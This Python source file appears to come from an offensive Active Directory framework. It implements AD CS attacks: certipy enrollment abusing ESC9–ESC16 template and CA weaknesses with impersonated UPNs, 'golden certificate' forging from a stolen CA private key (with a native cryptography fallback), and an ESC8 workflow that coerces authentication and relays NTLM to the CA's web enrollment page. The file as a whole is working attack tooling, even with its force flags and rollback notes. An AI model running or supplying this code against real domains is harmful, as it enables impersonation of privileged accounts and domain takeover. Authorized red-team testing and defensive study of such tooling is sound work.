"""AD CS ESC9-ESC16 enrollment, golden cert, and ESC8 relay workflow."""

from __future__ import annotations

import json
import subprocess
import sys
from typing import Any

from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.capabilities.coerce import Coerce
from adaf_attack.capabilities.ntlm_relay import NtlmRelay
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import finish, register_advisory_rollback, require_force
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

ESC_EXTRA: dict[str, tuple[str, ...]] = {
    "esc9": (),
    "esc10": (),
    "esc13": (),
    "esc14": (),
    "esc15": ("--application-policies", "1.3.6.1.5.5.7.3.2"),
    "esc16": (),
}

# What makes each ESC exploitable on a given template/CA. These are
# verification conditions for the operator; the certipy invocation is the same.
ESC_CONDITIONS: dict[str, dict[str, str]] = {
    "esc9": {
        "template_ssic": "Verify the template flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is NOT set and that the Security Extension (msPKI-Enrollment-Flag SSIC / 1.3.6.1.4.1.311.20.2) is present.",
        "ca_security_extension": "Confirm whether the CA has the security extension disabled (KDC/CA config); ESC9 requires re-issued certificates without the security extension to bypass mapping checks.",
        "mapping_reissue": "The certificate must be re-enrolled after the template change so the old cert's authentication fails mapping validation.",
    },
    "esc10": {
        "registry_mapping": "Check HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters on the DC for StrongCertificateBindingEnforcement=0 (or CertificateMappingMethods including UPN).",
        "weak_mapping": "ESC10 exploitation depends on weak certificate mapping being enabled via registry, not on template flags.",
    },
    "esc13": {
        "issuance_policy": "Verify the template's msPKI-Certificate-Policy points to an issuance policy OID whose group-link maps to a privileged group (e.g. Domain Admins).",
        "group_link": "Confirm the OID group-link in CN=OID,CN=Public Key Services,CN=Services grants membership in the target group on certificate presentation.",
    },
    "esc14": {
        "alt_security_identity": "Verify the template or CA supports explicit altSecurityIdentity mappings (certificate mapping via the altSecurityIdentity attribute).",
        "explicit_mapping": "ESC14 requires an existing or writable altSecurityIdentityClass entry binding a certificate to the victim account.",
    },
    "esc15": {
        "application_policies": "Verify the template defines application policies (msPKI-App-Policies) and accepts enrollee-supplied application policy OIDs, allowing EKU reuse via the API/policy extension.",
        "schema_v1": "The template should be schema v1 so the supplied --application-policies flag is honored during enrollment.",
    },
    "esc16": {
        "ca_security_extension_disabled": "Verify the CA itself was installed with the security extension disabled (CertUtil -getreg ca\\DisableExtensionList includes the SZOID_SECURITY_EXTENSION).",
        "state_check": "With the security extension disabled at the CA, all issued certificates skip Kerberos certificate-mapping hardening checks.",
    },
}


def _conditions_text(cap_id: str) -> str:
    lines = [f"# {cap_id.upper()} verification conditions"]
    lines += [f"- {k}: {v}" for k, v in ESC_CONDITIONS[cap_id].items()]
    return "\n".join(lines) + "\n"


def _load_adcs(session: Session) -> dict[str, Any] | None:
    path = session.path("adcs-enum.json")
    if not path.exists():
        parent = session.root.parent / "adcs-enum.json"
        path = parent if parent.exists() else path
    if not path.exists():
        return None
    try:
        payload = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    return payload if isinstance(payload, dict) else None


def _pick_template(adcs: dict[str, Any] | None, tag: str) -> str | None:
    if not adcs:
        return None
    templates = adcs.get("templates") or adcs.get("vulnerable_templates") or []
    for tpl in templates:
        signals = [str(s).upper() for s in (tpl.get("esc_tags") or tpl.get("esc_signals") or [])]
        name = tpl.get("cn") or tpl.get("name") or tpl.get("displayName")
        if name and (tag.upper() in signals or tpl.get(f"{tag.lower()}_candidate")):
            return str(name)
    if templates:
        first = templates[0]
        return str(first.get("cn") or first.get("name") or first.get("displayName") or "") or None
    cands = adcs.get("esc1_candidates") or []
    return str(cands[0]) if cands else None


def _pick_ca(adcs: dict[str, Any] | None) -> str | None:
    if not adcs:
        return None
    cas = adcs.get("cas") or []
    if not cas:
        return None
    first = cas[0]
    if isinstance(first, dict):
        return str(first.get("cn") or first.get("name") or first.get("display_name") or "") or None
    return str(first)


def _run_certipy(
    argv: list[str], session: Session, *, password: str | None = None
) -> dict[str, Any]:
    playbook = " ".join("***" if i and argv[i - 1] == "-p" else c for i, c in enumerate(argv))
    session.path("certipy.playbook.txt").write_text(playbook + "\n", encoding="utf-8")
    try:
        proc = subprocess.run(
            argv,
            cwd=str(session.root),
            capture_output=True,
            text=True,
            input=(password + "\n") if password else None,
            timeout=180,
        )
    except FileNotFoundError:
        return {"ok": False, "method": "playbook-only", "playbook": playbook}
    except Exception as exc:
        return {"ok": False, "method": "error", "error": str(exc), "playbook": playbook}
    pfxes = [str(p) for p in session.root.glob("*.pfx")]
    return {
        "ok": proc.returncode == 0,
        "method": "certipy",
        "returncode": proc.returncode,
        "stdout": (proc.stdout or "")[-3000:],
        "stderr": (proc.stderr or "")[-3000:],
        "pfx": pfxes[-1] if pfxes else None,
        "playbook": playbook,
    }


def _enroll(
    cap_id: str,
    target: Target,
    session: Session,
    graph: AttackGraph,
    kwargs: dict[str, Any],
    extra: tuple[str, ...],
) -> dict[str, Any]:
    require_force(cap_id, bool(kwargs.get("_force")))
    adcs = _load_adcs(session)
    template = kwargs.get("template") or _pick_template(adcs, cap_id.upper())
    ca = kwargs.get("ca") or _pick_ca(adcs)
    alt_name = kwargs.get("alt_name") or kwargs.get("upn")
    if not template:
        raise RuntimeError(f"{cap_id} requires -P template=<name> or a prior adcs-enum session")
    if not target.username:
        raise RuntimeError(f"{cap_id} requires --username")
    argv = [
        sys.executable,
        "-m",
        "certipy",
        "req",
        "-u",
        f"{target.username}@{target.domain}",
        "-dc-ip",
        target.dc_ip,
        "-template",
        str(template),
    ]
    if target.password:
        # Certipy prompts when -p is omitted. Keep the secret out of argv.
        password = target.password
    else:
        password = None
    if target.hashes:
        argv.extend(["-hashes", target.hashes])
    if ca:
        argv.extend(["-ca", str(ca)])
    if alt_name:
        argv.extend(["-upn", str(alt_name)])
    argv.extend(extra)
    enrolled = (
        _run_certipy(argv, session)
        if password is None
        else _run_certipy(argv, session, password=password)
    )
    session.path(f"{cap_id}.conditions.txt").write_text(_conditions_text(cap_id), encoding="utf-8")
    register_advisory_rollback(
        session,
        kind="cert-enroll",
        target=str(alt_name or target.username),
        rollback="Revoke the enrolled certificate on the CA if the request succeeded.",
    )
    result = {
        "ok": bool(enrolled.get("ok")),
        "template": template,
        "ca": ca,
        "alt_name": alt_name,
        "conditions": ESC_CONDITIONS[cap_id],
        **enrolled,
    }
    if result["ok"]:
        graph.add_edge(
            f"USER@{target.username.upper()}@{target.domain.upper()}",
            f"USER@{target.username.upper()}@{target.domain.upper()}",
            cap_id.upper(),
            template=template,
        )
    return finish(session, graph, cap_id, result, ok=result["ok"])


class _EscBase:
    cap_id = ""
    extra: tuple[str, ...] = ()

    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        kwargs = dict(kwargs)
        kwargs["_force"] = force
        return _enroll(self.cap_id, target, session, graph, kwargs, self.extra)


@register_from_catalog("esc9")
class Esc9(_EscBase):
    cap_id = "esc9"
    extra = ESC_EXTRA["esc9"]


@register_from_catalog("esc10")
class Esc10(_EscBase):
    cap_id = "esc10"
    extra = ESC_EXTRA["esc10"]


@register_from_catalog("esc13")
class Esc13(_EscBase):
    cap_id = "esc13"
    extra = ESC_EXTRA["esc13"]


@register_from_catalog("esc14")
class Esc14(_EscBase):
    cap_id = "esc14"
    extra = ESC_EXTRA["esc14"]


@register_from_catalog("esc15")
class Esc15(_EscBase):
    cap_id = "esc15"
    extra = ESC_EXTRA["esc15"]


@register_from_catalog("esc16")
class Esc16(_EscBase):
    cap_id = "esc16"
    extra = ESC_EXTRA["esc16"]


def _der_utf8_string(value: str) -> bytes:
    """DER-encode a UTF8String (tag 0x0c) for UPN otherName SAN values."""
    raw = value.encode("utf-8")
    length = len(raw)
    if length < 0x80:
        return b"\x0c" + bytes([length]) + raw
    # Long-form length (sufficient for UPNs)
    length_bytes = length.to_bytes((length.bit_length() + 7) // 8 or 1, "big")
    return b"\x0c" + bytes([0x80 | len(length_bytes)]) + length_bytes + raw


def _forge_golden_cert_native(
    session: Session,
    *,
    ca_pfx: str,
    upn: str,
    subject: str | None = None,
    pfx_password: bytes | None = None,
) -> dict[str, Any]:
    """Forge a client-auth cert signed by a stolen CA key (cryptography fallback)."""
    import datetime
    from pathlib import Path

    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

    ca_path = Path(ca_pfx)
    ca_key, ca_cert, _additional = pkcs12.load_key_and_certificates(
        ca_path.read_bytes(), password=pfx_password
    )
    if ca_key is None or ca_cert is None:
        return {"ok": False, "method": "native-forge", "error": "CA PFX missing key or cert"}

    leaf_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    cn = subject or upn.split("@")[0]
    builder = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
        .issuer_name(ca_cert.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.UTC) - datetime.timedelta(minutes=5))
        .not_valid_after(datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName(
                [
                    x509.OtherName(
                        # UPN otherName OID 1.3.6.1.4.1.311.20.2.3
                        x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),
                        _der_utf8_string(upn),
                    )
                ]
            ),
            critical=False,
        )
        .add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]),
            critical=True,
        )
    )
    from typing import cast

    leaf = builder.sign(private_key=cast(Any, ca_key), algorithm=hashes.SHA256())
    out_pfx = session.path(f"golden-{cn}.pfx")
    out_pfx.write_bytes(
        pkcs12.serialize_key_and_certificates(
            name=cn.encode("utf-8"),
            key=leaf_key,
            cert=leaf,
            cas=[ca_cert],
            encryption_algorithm=serialization.NoEncryption(),
        )
    )
    return {
        "ok": True,
        "method": "native-forge",
        "pfx": str(out_pfx),
        "upn": upn,
    }


@register_from_catalog("golden-cert")
class GoldenCert:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("golden-cert", force)
        pfx = kwargs.get("ca_pfx") or kwargs.get("pfx")
        upn = kwargs.get("upn") or kwargs.get("alt_name") or kwargs.get("sam")
        if not pfx:
            raise RuntimeError("golden-cert requires -P ca_pfx=<stolen-ca.pfx>")
        if not upn:
            raise RuntimeError("golden-cert requires -P upn=<user@domain>")
        argv = [
            sys.executable,
            "-m",
            "certipy",
            "forge",
            "-ca-pfx",
            str(pfx),
            "-upn",
            str(upn),
        ]
        if kwargs.get("subject"):
            argv.extend(["-subject", str(kwargs["subject"])])
        forged = _run_certipy(argv, session)
        if not forged.get("ok"):
            try:
                password = kwargs.get("pfx_password")
                forged = _forge_golden_cert_native(
                    session,
                    ca_pfx=str(pfx),
                    upn=str(upn),
                    subject=str(kwargs["subject"]) if kwargs.get("subject") else None,
                    pfx_password=password.encode() if isinstance(password, str) else password,
                )
            except Exception as exc:
                forged = {
                    **forged,
                    "native_forge_error": str(exc),
                    "ok": False,
                }
        register_advisory_rollback(
            session,
            kind="cert-enroll",
            target=str(upn),
            rollback="Revoke forged certificates issued from the stolen CA key.",
        )
        result = {"ok": bool(forged.get("ok")), "upn": upn, "ca_pfx": str(pfx), **forged}
        return finish(session, graph, "golden-cert", result, ok=result["ok"])


@register_from_catalog("esc8-relay-workflow")
class Esc8RelayWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("esc8-relay-workflow", force)
        ca_host = kwargs.get("ca") or kwargs.get("relay_target") or kwargs.get("host")
        if not ca_host:
            raise RuntimeError("esc8-relay-workflow requires -P ca=<web-enrollment-host>")
        listener = kwargs.get("listener") or target.dc_ip
        coerce_result: dict[str, Any] = {"skipped": "no_host"}
        if kwargs.get("coerce_host") or kwargs.get("allow_hosts"):
            coerce_result = Coerce().run(
                target,
                session,
                graph,
                force=True,
                listener=listener,
                host=kwargs.get("coerce_host"),
                allow_hosts=kwargs.get("allow_hosts") or kwargs.get("coerce_host"),
            )
        relay = NtlmRelay().run(
            target,
            session,
            graph,
            force=True,
            relay_targets=f"http://{ca_host}/certsrv/certfnsh.asp",
            duration_seconds=int(kwargs.get("duration_seconds") or 15),
        )
        result = {
            "ok": bool(relay.get("return_code") is not None),
            "coerce": coerce_result,
            "relay": relay,
        }
        register_advisory_rollback(
            session,
            kind="ntlm-relay",
            target=str(ca_host),
            rollback="Review ESC8 enrollment produced via HTTP relay and revoke issued certs.",
        )
        return finish(session, graph, "esc8-relay-workflow", result, ok=result["ok"])
